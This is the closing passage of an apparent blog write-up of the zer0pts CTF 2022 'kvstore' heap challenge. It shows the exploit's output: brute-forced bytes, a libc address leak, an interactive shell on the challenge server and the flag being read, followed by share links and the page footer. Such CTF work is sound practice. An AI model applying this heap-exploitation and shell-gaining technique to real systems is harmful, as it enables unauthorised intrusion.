+[+] Opening connection to pwn1.ctf.zer0pts.com on port 9005: Done
+[*] Found valid byte: 0xe0
+[*] Found valid byte: 0x9b
+[*] Found valid byte: 0x7c
+[*] Found valid byte: 0x46
+[*] Found valid byte: 0xae
+[*] Found valid byte: 0x7f
+[*] LIBC leak     : 0x7fae467c9be0
+[*] LIBC          : 0x7fae465dd000
+[*] Switching to interactive mode
+$ ls
+chall
+flag-e3e5116a5012f26b775d5ef5fdc2ec46.txt
+$ cat flag-e3e5116a5012f26b775d5ef5fdc2ec46.txt
+zer0pts{fclose-fwrite-fclose_2_byp4ss_d0ubl3_fr33_d3t3ct10n}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=zer0pts CTF 2022 - kvstore&amp;url=https://kileak.github.io/ctf/2022/zer0pts-kvstore/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2022/zer0pts-kvstore/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2022/zer0pts-kvstore';
+        var disqus_title = 'zer0pts CTF 2022 - kvstore';
+        var disqus_url = 'https://kileak.github.io/ctf/2022/zer0pts-kvstore';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
